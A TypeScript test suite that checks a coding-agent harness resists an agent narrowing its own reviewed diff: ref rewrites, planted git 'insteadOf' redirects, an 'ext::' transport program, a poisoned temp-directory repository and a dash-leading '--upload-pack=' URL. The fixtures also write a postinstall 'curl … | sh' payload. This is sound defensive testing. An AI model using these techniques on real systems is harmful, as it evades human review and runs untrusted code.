import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { ChildProcess, execFileSync, spawn } from "node:child_process";
import { appendFileSync, existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { AddressInfo } from "node:net";
import { createServer as tcpServer } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { collectDiff } from "./diff.js";
import { protectedPathsGate } from "./gates/protected-paths.js";
import { createRunner } from "./exec.js";
import { createWorkspace } from "./workspace.js";
import { hardenedGitConfig } from "./delivery.js";
import { WorkerConfig } from "./config.js";

/**
 * The headline attack this task is about: the agent advances refs/heads/<baseBranch> to its own
 * commit, so its earlier work — the one thing a diff against the true base would show — drops out
 * of the range entirely. workspace.ts resolves baseSha once, before the agent runs, exactly so a
 * later rewrite of the ref cannot narrow what collectDiff (called with that sha, not the ref name)
 * reports. Real createWorkspace, real collectDiff, real protectedPathsGate, against real git — a
 * mocked runner could only show that the arguments were spelled correctly.
 */

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    stdio: "pipe",
    env: { ...process.env, GIT_AUTHOR_NAME: "worker", GIT_AUTHOR_EMAIL: "worker@example.com" },
  }).toString();
}

// What an agent with Write can do to the shared config: every URL git sees, including one given
// literally on the command line, is rewritten by this — and repos.ts's scan never looks for it.
function plantRedirect(repoPath: string, from: string, to: string): void {
  const configPath = join(repoPath, ".git", "config");
  appendFileSync(configPath, `[url "${to}"]\n\tinsteadOf = ${from}\n`);
}

describe("a run's own diff cannot be narrowed from inside the worktree", () => {
  let dir: string;
  let parent: string;
  let origin: string;
  let trueMain: string;

  // No default for remoteUrl: passing an explicit `undefined` selects the default instead of the
  // value, which is how a test here once asserted the opposite of its own name.
  function workspaceFor(remoteUrl: string = origin) {
    return createWorkspace(
      { repoPath: parent, worktreeRoot: join(dir, "wt"), baseBranch: "main" } as WorkerConfig,
      createRunner(),
      () => ({}),
      remoteUrl
    );
  }

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp382-gate-integrity-"));
    // A real remote, because the base is now resolved off the wire rather than from the clone's
    // own ref store — which is the thing an agent of any earlier run can rewrite.
    origin = join(dir, "origin.git");
    execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", origin], { stdio: "pipe" });

    const seed = join(dir, "seed");
    execFileSync("git", ["init", "--quiet", "-b", "main", seed], { stdio: "pipe" });
    git(seed, "config", "user.email", "worker@example.com");
    git(seed, "config", "user.name", "worker");
    writeFileSync(join(seed, "package.json"), '{"name":"t"}\n');
    writeFileSync(join(seed, "README.md"), "# t\n");
    git(seed, "add", "-A");
    git(seed, "commit", "--quiet", "-m", "initial");
    git(seed, "push", "--quiet", origin, "HEAD:refs/heads/main");
    trueMain = git(seed, "rev-parse", "HEAD").trim();

    parent = join(dir, "parent");
    execFileSync("git", ["clone", "--quiet", origin, parent], { stdio: "pipe" });
    git(parent, "config", "user.email", "worker@example.com");
    git(parent, "config", "user.name", "worker");
  });

  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it("still sees a protected file after the base ref is rewritten under it", async () => {
    const runner = createRunner();
    const workspace = workspaceFor();
    const worktree = await workspace.create("BP-1", "worker");

    writeFileSync(
      join(worktree.path, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "payload");
    const payload = git(worktree.path, "rev-parse", "HEAD").trim();

    // The attack, with nothing but a file write: a linked worktree's .git file names the common
    // dir, so the shared ref store is an ordinary path. A loose ref shadows packed-refs, so
    // writing the loose file lands whether or not this branch happens to be packed.
    writeFileSync(join(parent, ".git", "refs", "heads", "main"), `${payload}\n`);

    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);
    const verdict = await protectedPathsGate().run({ diff } as never);

    expect(diff.changedFiles).toContain("package.json");
    expect(verdict.ok).toBe(false);
  });

  // The control the attack tests need to mean anything: an ordinary run's diff is exactly the
  // run's own change — not everything since the beginning of the repository, which would satisfy
  // "the payload is visible" while telling a reviewer nothing.
  it("reports exactly the run's own change when nothing is tampered with", async () => {
    const runner = createRunner();
    const worktree = await workspaceFor().create("BP-1", "worker");

    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);
    const verdict = await protectedPathsGate().run({ diff } as never);

    expect(worktree.baseSha).toBe(trueMain);
    expect(diff.changedFiles).toEqual(["README.md"]);
    expect(verdict.ok).toBe(true);
  });

  // The cross-run half. An agent cannot poison the base of the run it is inside — that sha is
  // captured first — but the ref store it writes outlives the run, so without a fetch the NEXT
  // run, an innocent one, would build on and deliver whatever it was left pointing at.
  it("ignores a base ref an earlier run's agent left poisoned before this run started", async () => {
    const runner = createRunner();

    const scratch = await workspaceFor().create("BP-0", "worker");
    writeFileSync(
      join(scratch.path, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    git(scratch.path, "add", "-A");
    git(scratch.path, "commit", "--quiet", "-m", "payload");
    const payload = git(scratch.path, "rev-parse", "HEAD").trim();
    writeFileSync(join(parent, ".git", "refs", "heads", "main"), `${payload}\n`);

    const worktree = await workspaceFor().create("BP-1", "worker");
    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);

    expect(worktree.baseSha).toBe(trueMain);
    expect(worktree.baseSha).not.toBe(payload);
    expect(diff.patch).not.toContain("postinstall");
    expect(git(worktree.path, "show", "HEAD:package.json")).not.toContain("postinstall");
  });

  // url.<x>.insteadOf rewrites even a URL passed literally in argv, and no GIT_CONFIG_* variable
  // disables it — so "we pass the URL, not the remote name" was never the boundary it claimed to
  // be. Running the call that decides the base outside any repository is.
  it("resolves the base from the pinned remote even when the clone's own config redirects that URL", async () => {
    const evil = join(dir, "evil");
    execFileSync("git", ["init", "--quiet", "-b", "main", evil], { stdio: "pipe" });
    git(evil, "config", "user.email", "attacker@example.com");
    git(evil, "config", "user.name", "attacker");
    writeFileSync(
      join(evil, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    writeFileSync(join(evil, "README.md"), "# t\n");
    git(evil, "add", "-A");
    git(evil, "commit", "--quiet", "-m", "evil base");

    plantRedirect(parent, origin, evil);

    const worktree = await workspaceFor().create("BP-1", "worker");

    expect(worktree.baseSha).toBe(trueMain);
    expect(git(worktree.path, "show", "HEAD:package.json")).not.toContain("postinstall");
  });

  // The fetch itself still runs inside the clone, so it can be redirected or simply broken. What
  // must not happen is a quiet fall back to the local ref — that ref is the vulnerability, and an
  // agent that can break the fetch would otherwise be choosing which path the next run takes.
  it("fails the run rather than falling back to the local ref when the fetch cannot complete", async () => {
    plantRedirect(parent, origin, join(dir, "nowhere"));

    await expect(workspaceFor().create("BP-1", "worker")).rejects.toThrow(/could not fetch main/);
  });

  it("refuses when no remote is configured for the checkout at all", async () => {
    await expect(workspaceFor("").create("BP-1", "worker")).rejects.toThrow(
      /no remote is configured/
    );
  });

  // The agent is handed TMPDIR (env.ts's allowlist) and can write there, and what it writes
  // outlives the run. A `.git` planted in that directory is honoured by anything git run from it —
  // GIT_CEILING_DIRECTORIES cannot help, because git never excludes the working directory itself.
  // The first attempt at this fix used os.tmpdir() directly and was poisonable exactly this way.
  it("resolves the base even when a repository is planted in the temp directory itself", async () => {
    const evil = join(dir, "evil");
    execFileSync("git", ["init", "--quiet", "-b", "main", evil], { stdio: "pipe" });
    git(evil, "config", "user.email", "attacker@example.com");
    git(evil, "config", "user.name", "attacker");
    writeFileSync(join(evil, "package.json"), '{"name":"t","scripts":{"postinstall":"curl x|sh"}}\n');
    writeFileSync(join(evil, "README.md"), "# t\n");
    git(evil, "add", "-A");
    git(evil, "commit", "--quiet", "-m", "evil base");

    const poisonedTmp = join(dir, "poisoned-tmp");
    mkdirSync(join(poisonedTmp, ".git", "objects"), { recursive: true });
    mkdirSync(join(poisonedTmp, ".git", "refs"), { recursive: true });
    writeFileSync(join(poisonedTmp, ".git", "HEAD"), "ref: refs/heads/main\n");
    writeFileSync(
      join(poisonedTmp, ".git", "config"),
      `[core]\n\trepositoryformatversion = 0\n[url "${evil}"]\n\tinsteadOf = ${origin}\n`
    );

    const realTmp = process.env.TMPDIR;
    process.env.TMPDIR = poisonedTmp;
    try {
      const worktree = await workspaceFor().create("BP-1", "worker");
      expect(worktree.baseSha).toBe(trueMain);
      expect(git(worktree.path, "show", "HEAD:package.json")).not.toContain("postinstall");
    } finally {
      if (realTmp === undefined) delete process.env.TMPDIR;
      else process.env.TMPDIR = realTmp;
    }
  });

  // Nothing else here ever gives the fetch something to do: the fixture pushes to origin once and
  // clones, so every object is already local and deleting the fetch outright leaves the rest of
  // this file green. With origin ahead, the fetch is the only way the base can be reached — and
  // `^{commit}` is the only thing that would notice if it had not been.
  it("fetches a base the checkout does not have yet", async () => {
    const ahead = join(dir, "ahead");
    execFileSync("git", ["clone", "--quiet", origin, ahead], { stdio: "pipe" });
    git(ahead, "config", "user.email", "someone@example.com");
    git(ahead, "config", "user.name", "someone");
    writeFileSync(join(ahead, "README.md"), "# t\nmoved on\n");
    git(ahead, "add", "-A");
    git(ahead, "commit", "--quiet", "-m", "someone else's work");
    git(ahead, "push", "--quiet", "origin", "HEAD:refs/heads/main");
    const newMain = git(ahead, "rev-parse", "HEAD").trim();

    // the clone has never seen it
    expect(() => git(parent, "cat-file", "-e", `${newMain}^{commit}`)).toThrow();

    const worktree = await workspaceFor().create("BP-1", "worker");

    expect(worktree.baseSha).toBe(newMain);
    expect(worktree.baseSha).not.toBe(trueMain);
    expect(git(worktree.path, "show", "HEAD:README.md")).toContain("moved on");
  });

  // `--` is what keeps a value beginning with a dash out of git's option slots. Asserting the
  // spelling of the argv proves only the spelling; this runs a real git against a URL that would
  // execute a program if the guard were not there.
  it("does not execute a program named by a dash-leading remote URL", async () => {
    const marker = join(dir, "executed");
    const program = join(dir, "upload-pack.sh");
    writeFileSync(program, `#!/bin/sh\ntouch ${marker}\nexit 1\n`, { mode: 0o755 });

    await expect(
      workspaceFor(`--upload-pack=${program}`).create("BP-1", "worker")
    ).rejects.toThrow();

    expect(existsSync(marker)).toBe(false);
  });
});

/**
 * The fetch that freshens the base runs in `config.repoPath`, whose config a previous run's agent
 * can write — and a transport is not configuration git can be talked out of afterwards: an
 * `[url "ext::<program> %S"] insteadOf = <the pinned URL>` hands the URL to that program. Measured
 * on git 2.50.1 against this fixture: the plain fetch RAN the program, and the same fetch under
 * `protocol.ext.allow=never` answered `transport 'ext' not allowed` and ran nothing.
 *
 * The describe above builds its workspace with `() => ({})`, which is not an environment
 * production ever passes, so it could not have caught the loss of the hardening. This one uses
 * what wiring.ts composes. It needs a `git://` remote to do it: hardenedGitConfig also refuses the
 * `file` transport, so a local-path origin would fail at ls-remote and never reach the fetch this
 * test is about.
 */

// Mirrors wiring.ts's remoteFetchEnv, minus the operator's token, which a daemon does not want.
// That function is private to wiring.ts; hardenedGitConfig is the part of it under test.
const productionRemoteEnv = (): NodeJS.ProcessEnv => ({ ...hardenedGitConfig() });

const freePort = (): Promise<number> =>
  new Promise((resolve) => {
    const probe = tcpServer();
    probe.listen(0, "127.0.0.1", () => {
      const { port } = probe.address() as AddressInfo;
      probe.close(() => resolve(port));
    });
  });

describe("the base lookup runs with the environment production gives it", () => {
  let dir: string;
  let parent: string;
  let remoteUrl: string;
  let marker: string;
  let daemon: ChildProcess;

  beforeEach(async () => {
    dir = mkdtempSync(join(tmpdir(), "bp382-fetch-env-"));
    const origin = join(dir, "origin.git");
    execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", origin], { stdio: "pipe" });

    const seed = join(dir, "seed");
    execFileSync("git", ["init", "--quiet", "-b", "main", seed], { stdio: "pipe" });
    git(seed, "config", "user.email", "worker@example.com");
    git(seed, "config", "user.name", "worker");
    writeFileSync(join(seed, "README.md"), "# t\n");
    git(seed, "add", "-A");
    git(seed, "commit", "--quiet", "-m", "initial");
    git(seed, "push", "--quiet", origin, "HEAD:refs/heads/main");

    const port = await freePort();
    daemon = spawn(
      "git",
      [
        "daemon",
        "--export-all",
        `--base-path=${dir}`,
        `--port=${port}`,
        "--listen=127.0.0.1",
        dir,
      ],
      { stdio: "pipe" }
    );
    await new Promise((resolve) => setTimeout(resolve, 700));
    remoteUrl = `git://127.0.0.1:${port}/origin.git`;

    parent = join(dir, "parent");
    execFileSync("git", ["clone", "--quiet", remoteUrl, parent], { stdio: "pipe" });
    git(parent, "config", "user.email", "worker@example.com");
    git(parent, "config", "user.name", "worker");

    marker = join(dir, "the-planted-program-ran");
    const program = join(dir, "payload.sh");
    writeFileSync(program, `#!/bin/sh\ntouch ${marker}\nexit 1\n`, { mode: 0o755 });
    appendFileSync(
      join(parent, ".git", "config"),
      `[url "ext::${program} %S"]\n\tinsteadOf = ${remoteUrl}\n[protocol]\n\tallow = always\n`
    );
  });

  afterEach(() => {
    daemon.kill();
    rmSync(dir, { recursive: true, force: true });
  });

  /**
   * BP-504 put a scan of the checkout's own config **ahead of** the checkout, and it now fires
   * before this fixture can reach a fetch at all: `protocol.allow = always` and an `ext::`
   * `insteadOf` are both repository-scope entries the scan refuses on their own. So the assertion
   * moved from git's own `transport 'ext' not allowed` to the earlier refusal — the property, that
   * the planted program never runs, is unchanged and still the point.
   *
   * What that costs, said plainly rather than left for somebody to discover: this file no longer
   * proves end-to-end that `protocol.ext.allow=never` is what stops the fetch, because there is no
   * longer a way to reach one through a repo-scope `insteadOf` — every scope such a key can live
   * in is scanned first, and `GIT_CONFIG_GLOBAL=/dev/null` neutralises the operator's own file.
   * The hardening is still watched: wiring.test.ts and delivery.test.ts assert the composed env
   * carries that pair, and delivery.hooks.integration.test.ts drives real git with the flag on.
   */
  it("does not execute a program the checkout wired into the fetch transport", async () => {
    const workspace = createWorkspace(
      { repoPath: parent, worktreeRoot: join(dir, "wt"), baseBranch: "main" } as WorkerConfig,
      createRunner(),
      productionRemoteEnv,
      remoteUrl
    );

    // Named rather than "it rejects": the message proves which layer stopped it, so a refusal
    // arriving for some unrelated reason cannot pass for this one.
    await expect(workspace.create("BP-1", "worker")).rejects.toMatchObject({
      name: "PoisonedCheckoutError",
      message: expect.stringContaining("protocol.allow"),
    });
    expect(existsSync(marker)).toBe(false);
  });
});
